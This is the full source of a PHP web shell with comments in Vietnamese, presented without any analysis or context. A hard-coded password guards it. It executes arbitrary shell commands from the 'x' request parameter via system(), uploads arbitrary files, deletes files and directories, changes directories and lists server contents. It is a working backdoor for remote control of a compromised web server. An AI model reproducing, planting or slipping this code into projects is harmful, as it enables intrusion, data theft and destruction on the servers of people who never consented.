<?php
$password = "Deoxyz@111";

if (!isset($_REQUEST['pass']) || $_REQUEST['pass'] !== $password) {
    exit("Access denied");
}

// Hàm lấy đường dẫn hiện tại
function getCurrentDir() {
    return getcwd();
}

// Thay đổi thư mục
if (isset($_REQUEST['cd'])) {
    $dir = $_REQUEST['cd'];
    if (is_dir($dir)) {
        chdir($dir);
    }
}

// Upload file
if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
    $uploadFile = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
        echo "Upload thành công: $uploadFile<br>";
    } else {
        echo "Upload thất bại<br>";
    }
}

// Xóa file hoặc thư mục
if (isset($_REQUEST['delete'])) {
    $target = $_REQUEST['delete'];
    if (is_dir($target)) {
        rmdir($target) ? print("Đã xóa thư mục: $target<br>") : print("Xóa thư mục thất bại: $target<br>");
    } elseif (is_file($target)) {
        unlink($target) ? print("Đã xóa file: $target<br>") : print("Xóa file thất bại: $target<br>");
    } else {
        echo "Không tìm thấy file/thư mục: $target<br>";
    }
}

// Thực thi lệnh shell
if (isset($_REQUEST['x'])) {
    echo "<pre>";
    system($_REQUEST['x']);
    echo "</pre>";
}

// Hiển thị thư mục và danh sách file
echo "<hr>";
echo "Thư mục hiện tại: " . htmlspecialchars(getCurrentDir()) . "<br>";
echo "<ul>";
foreach (scandir(getCurrentDir()) as $file) {
    if ($file === '.') continue;
    $isDir = is_dir($file) ? "[DIR]" : "";
    echo "<li>$file $isDir 
    <a href='?pass=$password&delete=" . urlencode($file) . "' onclick='return confirm(\"Bạn có chắc muốn xóa $file?\");'>[Xóa]</a>
    </li>";
}
echo "</ul>";

// Form thay đổi thư mục
echo "<form method='GET'>
    <input type='hidden' name='pass' value='" . htmlspecialchars($password) . "'>
    Chuyển thư mục: <input type='text' name='cd' placeholder='Nhập đường dẫn'>
    <input type='submit' value='Chuyển'>
</form>";

// Form upload file
echo "<form method='POST' enctype='multipart/form-data'>
    <input type='hidden' name='pass' value='" . htmlspecialchars($password) . "'>
    Upload file: <input type='file' name='upload'>
    <input type='submit' value='Upload'>
</form>";
?>
